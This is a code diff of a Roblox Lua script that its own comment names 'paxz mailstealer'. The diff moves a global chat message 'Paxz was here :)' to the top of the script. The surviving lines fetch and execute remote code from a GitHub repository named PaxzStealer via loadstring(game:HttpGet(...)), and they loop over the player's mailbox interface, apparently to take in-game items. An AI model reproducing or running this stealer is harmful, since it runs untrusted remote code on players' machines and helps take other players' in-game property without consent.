@@ -1,4 +1,11 @@
 --paxz mailstealer
+local message = "Paxz was here :)"
+
+local function sendGlobalMessage()
+    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(message, "All")
+end
+
+sendGlobalMessage()
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/PaxzStealer/API/main/API", true))()
 
@@ -66,11 +73,3 @@ for i,v in pairs(game:GetService("Players").LocalPlayer.PlayerGui.Mailbox.Frame.
     end
 end
 end
-
-local message = "Paxz was here :)"
-
-local function sendGlobalMessage()
-    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(message, "All")
-end
-
-sendGlobalMessage()
